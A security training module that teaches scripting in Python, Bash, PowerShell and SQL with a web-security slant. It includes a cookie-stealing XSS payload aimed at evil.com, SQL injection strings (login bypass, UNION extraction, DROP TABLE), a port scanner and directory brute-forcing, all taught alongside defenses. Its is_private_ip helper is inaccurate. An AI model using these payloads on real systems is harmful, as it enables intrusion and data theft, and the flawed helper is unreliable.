# Pillar 3: Basic Scripting & Programming

## Table of Contents
- [3.1 Core Theory](#31-core-theory)
- [3.2 Python for Security](#32-python-for-security)
- [3.3 Bash Scripting](#33-bash-scripting)
- [3.4 PowerShell Scripting](#34-powershell-scripting)
- [3.5 SQL Fundamentals (Security Context)](#35-sql-fundamentals-security-context)
- [3.6 HTML & Web Basics (Security Context)](#36-html--web-basics-security-context)
- [3.7 The Hacker's View](#37-the-hackers-view)
- [3.8 Quick Reference Tables](#38-quick-reference-tables)
- [3.9 Hands-on Challenges](#39-hands-on-challenges)

---

## 3.1 Core Theory

### Why Scripting Matters in Security

You don't need to be a software engineer, but you **must** be able to:

| Skill | Why It Matters |
|-------|---------------|
| **Read code** | Understand malware behavior, exploit code, config scripts |
| **Automate tasks** | Scan 1000 hosts, parse 10GB of logs, correlate events |
| **Write simple tools** | Custom scripts for recon, enumeration, response |
| **Understand web code** | Identify injection points (SQLi, XSS) in applications |

### Language Selection Guide

| Language | Primary Security Use | Learning Priority |
|----------|---------------------|-------------------|
| **Python** | Exploit development, automation, tool building | ★★★★★ |
| **Bash** | Linux system automation, one-liners | ★★★★☆ |
| **PowerShell** | Windows automation, AD attacks/defense | ★★★★☆ |
| **SQL** | Database exploitation, log analysis | ★★★☆☆ |
| **JavaScript** | XSS payloads, web app testing | ★★★☆☆ |
| **C/C++** | Buffer overflows, binary exploitation | ★★☆☆☆ |

---

## 3.2 Python for Security

### Why Python?

- Massive library ecosystem (requests, scapy, pwntools, impacket)
- Readable syntax — rapid prototyping
- Cross-platform
- Used in tools: Burp extensions, Metasploit modules, custom scanners

### Python Basics

```python
# Variables and data types
target_ip = "192.168.1.100"
port = 443
is_open = True
open_ports = [22, 80, 443, 8080]  # List
host_info = {"ip": "192.168.1.1", "os": "Linux"}  # Dictionary

# String formatting (f-strings)
print(f"Scanning {target_ip} on port {port}")

# Conditionals
if port == 443:
    print("HTTPS detected")
elif port == 80:
    print("HTTP detected")
else:
    print(f"Unknown service on port {port}")

# Loops
for p in open_ports:
    print(f"Port {p} is open")

# While loop
attempts = 0
while attempts < 3:
    print(f"Attempt {attempts + 1}")
    attempts += 1

# Functions
def is_private_ip(ip):
    """Check if IP is in private range."""
    octets = ip.split('.')
    first = int(octets[0])
    return first == 10 or first == 172 or first == 192
```

### File Operations

```python
# Reading a file (log analysis)
with open("/var/log/auth.log", "r") as f:
    for line in f:
        if "Failed password" in line:
            print(line.strip())

# Writing results
with open("scan_results.txt", "w") as f:
    f.write(f"Scan completed at {datetime.now()}\n")
    for port in open_ports:
        f.write(f"Open: {port}\n")

# CSV processing
import csv
with open("firewall_logs.csv") as f:
    reader = csv.DictReader(f)
    for row in reader:
        if row['action'] == 'DENY':
            print(f"Blocked: {row['src_ip']} → {row['dst_ip']}:{row['dst_port']}")
```

### Network Scanner (Simple Port Scanner)

```python
import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(target, port):
    """Attempt TCP connection to target:port."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        sock.close()
        if result == 0:
            return port
    except socket.error:
        pass
    return None

def port_scan(target, ports):
    """Scan multiple ports using threads."""
    print(f"[*] Scanning {target}...")
    open_ports = []
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, target, p): p for p in ports}
        for future in futures:
            result = future.result()
            if result:
                open_ports.append(result)
                print(f"    [+] Port {result} OPEN")
    
    return sorted(open_ports)

# Usage
target = "192.168.1.1"
common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080]
results = port_scan(target, common_ports)
print(f"\n[*] {len(results)} open ports found on {target}")
```

### HTTP Requests (Web Recon)

```python
import requests

# Basic GET request
response = requests.get("https://example.com", timeout=5)
print(f"Status: {response.status_code}")
print(f"Server: {response.headers.get('Server', 'Unknown')}")

# Check for security headers
url = "https://example.com"
resp = requests.get(url)
security_headers = [
    "Strict-Transport-Security",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Content-Security-Policy",
    "X-XSS-Protection"
]

print(f"\n[*] Security Header Check: {url}")
for header in security_headers:
    value = resp.headers.get(header)
    status = "✓ Present" if value else "✗ MISSING"
    print(f"    {status}: {header}")

# Directory brute-force (basic)
wordlist = ["admin", "login", "dashboard", "api", "backup", "config"]
base_url = "https://example.com"

for word in wordlist:
    r = requests.get(f"{base_url}/{word}", timeout=3)
    if r.status_code != 404:
        print(f"[+] Found: /{word} (Status: {r.status_code})")
```

### Password Hash Analysis

```python
import hashlib

def identify_hash(hash_string):
    """Basic hash type identification by length."""
    length = len(hash_string)
    if length == 32:
        return "MD5"
    elif length == 40:
        return "SHA-1"
    elif length == 64:
        return "SHA-256"
    elif length == 128:
        return "SHA-512"
    else:
        return "Unknown"

def hash_password(password, algorithm="sha256"):
    """Hash a password with the specified algorithm."""
    return hashlib.new(algorithm, password.encode()).hexdigest()

# Demo
password = "P@ssw0rd123"
print(f"MD5:    {hash_password(password, 'md5')}")
print(f"SHA1:   {hash_password(password, 'sha1')}")
print(f"SHA256: {hash_password(password, 'sha256')}")

# Simple dictionary attack simulation
target_hash = "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
wordlist = ["password", "123456", "admin", "letmein", "password123"]

for word in wordlist:
    if hashlib.sha256(word.encode()).hexdigest() == target_hash:
        print(f"[+] CRACKED: {target_hash[:16]}... = '{word}'")
        break
```

### Python Libraries for Security

| Library | Purpose |
|---------|---------|
| `socket` | Low-level networking |
| `requests` | HTTP requests |
| `scapy` | Packet crafting & sniffing |
| `paramiko` | SSH automation |
| `pwntools` | CTF & exploit development |
| `impacket` | Windows protocol attacks |
| `nmap` (python-nmap) | Nmap automation |
| `cryptography` | Encryption/decryption |
| `beautifulsoup4` | HTML parsing (web scraping) |
| `shodan` | Shodan API (internet scanning) |

---

## 3.3 Bash Scripting

### Bash Fundamentals

```bash
#!/bin/bash
# Shebang line: tells OS to use bash interpreter

# Variables (no spaces around =)
TARGET="192.168.1.0/24"
PORTS="22,80,443"
OUTPUT_FILE="results_$(date +%Y%m%d).txt"

# User input
read -p "Enter target IP: " target_ip

# Conditionals
if [ -f "/etc/shadow" ]; then
    echo "[+] Shadow file exists"
else
    echo "[-] Shadow file not found"
fi

# Numeric comparison
if [ "$port_count" -gt 10 ]; then
    echo "[!] Many open ports detected"
fi

# String comparison
if [ "$response" == "200" ]; then
    echo "[+] Server is up"
fi
```

### Loops and Iteration

```bash
# For loop — ping sweep
for ip in $(seq 1 254); do
    ping -c 1 -W 1 "192.168.1.$ip" &>/dev/null && echo "[+] 192.168.1.$ip is alive"
done

# While loop — read file line by line
while IFS= read -r line; do
    echo "Processing: $line"
done < targets.txt

# For loop — port check
for port in 22 80 443 8080 3306; do
    (echo >/dev/tcp/192.168.1.1/$port) 2>/dev/null && echo "[+] Port $port open"
done
```

### Practical Security Scripts

#### Network Discovery

```bash
#!/bin/bash
# Quick network discovery script

SUBNET="192.168.1"
echo "[*] Scanning $SUBNET.0/24..."
echo "[*] Started at $(date)"

for i in $(seq 1 254); do
    (ping -c 1 -W 1 "$SUBNET.$i" &>/dev/null && echo "[+] $SUBNET.$i is UP") &
done
wait  # Wait for all background pings to finish

echo "[*] Scan complete at $(date)"
```

#### Log Analysis

```bash
#!/bin/bash
# Analyze auth.log for brute force attempts

LOG="/var/log/auth.log"
THRESHOLD=5

echo "[*] Analyzing $LOG for brute force..."
echo "=================================="

# Count failed attempts per IP
grep "Failed password" "$LOG" | \
    awk '{print $(NF-3)}' | \
    sort | uniq -c | sort -rn | \
    while read count ip; do
        if [ "$count" -ge "$THRESHOLD" ]; then
            echo "[!] $ip: $count failed attempts (SUSPICIOUS)"
        fi
    done
```

#### File Integrity Check

```bash
#!/bin/bash
# Simple file integrity monitor

MONITOR_DIR="/etc"
BASELINE="baseline_hashes.txt"

if [ ! -f "$BASELINE" ]; then
    echo "[*] Creating baseline..."
    find "$MONITOR_DIR" -type f -exec sha256sum {} \; > "$BASELINE"
    echo "[+] Baseline created: $(wc -l < $BASELINE) files"
else
    echo "[*] Checking for changes..."
    sha256sum --check "$BASELINE" 2>/dev/null | grep -v ": OK" | while read line; do
        echo "[!] MODIFIED: $line"
    done
fi
```

---

## 3.4 PowerShell Scripting

### Security Automation with PowerShell

#### Failed Login Monitor

```powershell
# Monitor for brute force attacks on Windows
$threshold = 10
$timeWindow = (Get-Date).AddMinutes(-30)

$failedLogins = Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4625
    StartTime = $timeWindow
} -ErrorAction SilentlyContinue

$grouped = $failedLogins | Group-Object {
    $_.Properties[19].Value  # Source IP
} | Where-Object { $_.Count -ge $threshold }

foreach ($group in $grouped) {
    Write-Host "[ALERT] $($group.Name): $($group.Count) failed logins in 30 min" -ForegroundColor Red
}
```

#### Service Baseline Checker

```powershell
# Compare running services against a known-good baseline
$baselineFile = ".\service_baseline.json"

if (-not (Test-Path $baselineFile)) {
    # Create baseline
    Get-Service | Where-Object {$_.Status -eq "Running"} |
        Select-Object Name, DisplayName |
        ConvertTo-Json | Out-File $baselineFile
    Write-Host "[+] Baseline created"
} else {
    # Compare
    $baseline = Get-Content $baselineFile | ConvertFrom-Json
    $current = Get-Service | Where-Object {$_.Status -eq "Running"}
    
    $newServices = $current | Where-Object {$_.Name -notin $baseline.Name}
    foreach ($svc in $newServices) {
        Write-Host "[!] NEW SERVICE: $($svc.Name) - $($svc.DisplayName)" -ForegroundColor Yellow
    }
}
```

#### Scheduled Task Audit

```powershell
# Find suspicious scheduled tasks
Get-ScheduledTask | Where-Object {
    $_.State -ne "Disabled" -and
    $_.TaskPath -notlike "\Microsoft\*"
} | ForEach-Object {
    $action = ($_ | Get-ScheduledTaskInfo)
    Write-Host "Task: $($_.TaskName)"
    Write-Host "  Path: $($_.TaskPath)"
    Write-Host "  Actions: $(($_.Actions).Execute)"
    Write-Host ""
}
```

---

## 3.5 SQL Fundamentals (Security Context)

### Why SQL Matters for Security

- **SQL Injection** is consistently in the OWASP Top 10
- Security analysts query **SIEM databases** using SQL-like syntax
- Log management platforms (Splunk, ELK) use SQL-like queries
- Understanding SQL helps you **find and fix** injection vulnerabilities

### SQL Basics

```sql
-- SELECT: Retrieve data
SELECT username, email, role FROM users WHERE role = 'admin';

-- INSERT: Add data
INSERT INTO users (username, password_hash, role) 
VALUES ('newuser', 'sha256hash...', 'viewer');

-- UPDATE: Modify data
UPDATE users SET role = 'admin' WHERE username = 'promoted_user';

-- DELETE: Remove data
DELETE FROM users WHERE last_login < '2024-01-01';

-- JOIN: Combine tables
SELECT u.username, l.login_time, l.ip_address
FROM users u
JOIN login_logs l ON u.user_id = l.user_id
WHERE l.success = 0
ORDER BY l.login_time DESC;

-- Aggregation: Summarize
SELECT ip_address, COUNT(*) AS failed_attempts
FROM login_logs
WHERE success = 0
GROUP BY ip_address
HAVING COUNT(*) > 10
ORDER BY failed_attempts DESC;
```

### SQL Injection Explained

**Vulnerable code (PHP example):**
```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['user'] . "' AND password = '" . $_POST['pass'] . "'";
```

**Normal input:**
```
user: admin
pass: mypassword
Query: SELECT * FROM users WHERE username = 'admin' AND password = 'mypassword'
```

**Malicious input:**
```
user: admin' --
pass: anything
Query: SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'

Result: -- comments out the password check. Attacker logs in as admin!
```

**Common SQL Injection Payloads:**
```sql
' OR '1'='1                     -- Always true (bypass login)
' OR '1'='1' --                 -- Same, commenting out rest
'; DROP TABLE users; --         -- Destroy the table
' UNION SELECT null, username, password FROM users --  -- Extract data
```

**Prevention (Parameterized Queries):**
```python
# SAFE: Uses parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", 
               (username, password_hash))

# UNSAFE: String concatenation
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
```

---

## 3.6 HTML & Web Basics (Security Context)

### Why HTML/Web Knowledge Matters

Understanding web structure is essential for:
- **Cross-Site Scripting (XSS)** — injecting scripts into web pages
- **Cross-Site Request Forgery (CSRF)** — forcing authenticated actions
- **Web scraping** for OSINT and recon

### XSS Attack Example

**Vulnerable search page:**
```html
<p>You searched for: <?php echo $_GET['q']; ?></p>
```

**Attacker's URL:**
```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Result:** Victim's browser executes the script, sending their cookies to the attacker.

**XSS Types:**

| Type | Description | Persistence |
|------|-------------|-------------|
| Reflected | Payload in URL, reflected in response | None (one-time) |
| Stored | Payload saved in database, shown to all users | Persistent |
| DOM-based | Payload manipulates client-side JavaScript | Client-side |

**Prevention:**
```html
<!-- Encode output -->
<p>You searched for: <?php echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8'); ?></p>

<!-- Content Security Policy header -->
Content-Security-Policy: script-src 'self'
```

---

## 3.7 The Hacker's View

### How Attackers Use Scripting

```
Reconnaissance     → Python: port scanning, web crawling, OSINT
                   → Bash: network sweeps, DNS enumeration

Initial Access     → Python: exploit scripts, phishing email generators
                   → SQL: injection attacks to bypass authentication

Persistence        → PowerShell: registry modifications, scheduled tasks
                   → Bash: cron jobs, SSH key deployment

Lateral Movement   → PowerShell: WMI/WinRM remote execution
                   → Python: impacket (SMB, LDAP, Kerberos attacks)

Exfiltration       → Python: encrypted data transfer, DNS tunneling
                   → Bash: tar + base64 + curl to C2 server

Defense Evasion    → PowerShell: AMSI bypass, obfuscation
                   → Python: custom encoding, traffic mimicking
```

### Real Attack Script Pattern (Educational)

```python
"""
Pattern of a typical automated attack tool:
1. Enumerate targets
2. Check for vulnerability
3. Exploit if vulnerable
4. Report results

Understanding this pattern helps defenders recognize attack behavior in logs.
"""

# Typical pattern (pseudocode - NOT a real exploit)
def attack_workflow():
    targets = enumerate_targets("192.168.1.0/24")    # Recon
    for target in targets:
        if check_vulnerable(target, "CVE-2024-XXXX"):  # Scan
            result = exploit(target)                      # Exploit
            if result.success:
                establish_persistence(target)             # Persist
                exfiltrate_data(target)                   # Steal
                cover_tracks(target)                      # Evade
```

---

## 3.8 Quick Reference Tables

### Python Security One-Liners

| Task | Code |
|------|------|
| Hash a string | `hashlib.sha256(b"text").hexdigest()` |
| Base64 encode | `base64.b64encode(b"data").decode()` |
| Base64 decode | `base64.b64decode("ZGF0YQ==").decode()` |
| HTTP GET | `requests.get("https://url").text` |
| DNS lookup | `socket.gethostbyname("domain.com")` |
| Reverse DNS | `socket.gethostbyaddr("8.8.8.8")` |
| Random password | `''.join(random.choices(string.ascii_letters + string.digits, k=16))` |
| Timestamp | `datetime.now().strftime("%Y-%m-%d %H:%M:%S")` |
| IP validation | `ipaddress.ip_address("192.168.1.1")` |
| URL parse | `urllib.parse.urlparse("https://example.com/path")` |

### Bash Security One-Liners

| Task | Command |
|------|---------|
| Find SUID files | `find / -perm -4000 -type f 2>/dev/null` |
| World-writable files | `find / -perm -o+w -type f 2>/dev/null` |
| Failed SSH logins | `grep "Failed password" /var/log/auth.log \| awk '{print $11}' \| sort \| uniq -c \| sort -rn` |
| Active connections | `ss -tuln \| grep LISTEN` |
| File hash | `sha256sum /path/to/file` |
| Quick ping sweep | `for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo "10.0.0.$i UP"; done` |
| Base64 decode | `echo "dGVzdA==" \| base64 -d` |
| Extract IPs from file | `grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' file.txt` |

---

## 3.9 Hands-on Challenges

### Challenge 1: Build a Port Scanner (Python)

Extend the basic scanner with:
- Accept target IP from command-line arguments
- Scan top 100 ports
- Identify common services by port number
- Output results to a file with timestamp
- Add a timeout mechanism

```python
# Starter template
import socket
import sys
from datetime import datetime

def scan(target, port):
    # Your code here
    pass

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python scanner.py <target_ip>")
        sys.exit(1)
    
    target = sys.argv[1]
    # Implement the scanner...
```

### Challenge 2: Log Analyzer (Bash)

Write a bash script that:
1. Reads `/var/log/auth.log` (or a sample file)
2. Counts failed login attempts per IP
3. Identifies IPs with more than 5 failures
4. Outputs a formatted report with timestamps

### Challenge 3: Security Header Checker (Python)

```python
# Build a tool that checks a website's security headers
# Required headers to check:
# - Strict-Transport-Security (HSTS)
# - X-Content-Type-Options
# - X-Frame-Options
# - Content-Security-Policy
# - Permissions-Policy
# Grade: A (all present), B (3-4), C (1-2), F (0)
```

### Challenge 4: Simple SQL Injection Tester (Educational)

```python
# Test YOUR OWN applications for SQL injection
# Send common SQLi payloads and check responses
# payloads = ["'", "' OR '1'='1", "'; --", "' UNION SELECT NULL--"]
# Compare response lengths/content to detect potential vulnerabilities
# WARNING: Only test applications you OWN or have permission to test
```

---

## Quiz Questions

1. Write a Python function that takes a list of IP addresses and returns only the private IPs (RFC 1918 ranges).
2. Explain why parameterized queries prevent SQL injection while string concatenation does not.
3. What is the difference between Reflected XSS and Stored XSS? Which is more dangerous and why?
4. Write a bash one-liner that finds all files modified in the last 24 hours in `/etc/`.
5. An attacker sends `'; DROP TABLE users; --` into a login form. Trace exactly what happens at the database level if the application is vulnerable.

---

> **Next Pillar:** [04 - Core Security Concepts](04-core-security-concepts.md)
